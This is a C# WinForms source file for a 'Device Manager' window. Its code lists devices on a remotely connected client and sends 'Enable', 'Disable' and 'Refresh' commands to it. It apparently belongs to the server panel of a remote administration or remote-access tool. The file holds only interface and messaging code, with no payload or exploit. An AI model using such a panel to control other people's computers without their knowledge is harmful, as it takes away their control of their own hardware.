using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormDeviceManager : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem stopToolStripMenuItem;

	private Panel panel1;

	public DataGridView dataGridView2;

	public MaterialLabel materialLabel1;

	private ToolStripMenuItem startToolStripMenuItem;

	private ToolStripMenuItem refreshToolStripMenuItem;

	private ToolStripSeparator sToolStripMenuItem;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column4;

	public FormDeviceManager()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
	}

	private void ChangeScheme(object sender)
	{
		dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private string[] NameSelected()
	{
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			list.Add((string)dataGridViewRow.Cells[0].Value);
		}
		return list.ToArray();
	}

	private void startToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			client.Send(new object[2]
			{
				"Enable",
				string.Join(";", NameSelected())
			});
		}
	}

	private void stopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count != 0)
		{
			client.Send(new object[2]
			{
				"Disable",
				string.Join(";", NameSelected())
			});
		}
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(new object[1] { "Refresh" });
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormDeviceManager));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
		this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip1.SuspendLayout();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.refreshToolStripMenuItem, this.sToolStripMenuItem, this.startToolStripMenuItem, this.stopToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(114, 76);
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
		this.refreshToolStripMenuItem.Text = "Refresh";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.sToolStripMenuItem.Name = "sToolStripMenuItem";
		this.sToolStripMenuItem.Size = new System.Drawing.Size(110, 6);
		this.startToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("startToolStripMenuItem.Image");
		this.startToolStripMenuItem.Name = "startToolStripMenuItem";
		this.startToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
		this.startToolStripMenuItem.Text = "Enable";
		this.startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
		this.stopToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("stopToolStripMenuItem.Image");
		this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
		this.stopToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
		this.stopToolStripMenuItem.Text = "Disable";
		this.stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.Location = new System.Drawing.Point(3, 512);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(794, 20);
		this.panel1.TabIndex = 1;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 1;
		this.materialLabel1.Text = "Please wait...";
		this.dataGridView2.AllowDrop = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column1, this.Column2, this.Column3, this.Column4);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView2.Location = new System.Drawing.Point(3, 64);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(794, 448);
		this.dataGridView2.TabIndex = 17;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column1.HeaderText = "Name";
		this.Column1.MinimumWidth = 150;
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.Width = 150;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column2.HeaderText = "Class";
		this.Column2.MinimumWidth = 100;
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column3.HeaderText = "Status";
		this.Column3.MinimumWidth = 70;
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 70;
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column4.HeaderText = "Description";
		this.Column4.MinimumWidth = 100;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(800, 535);
		base.Controls.Add(this.dataGridView2);
		base.Controls.Add(this.panel1);
		base.Name = "FormDeviceManager";
		this.Text = "Device Manager ";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		base.ResumeLayout(false);
	}
}
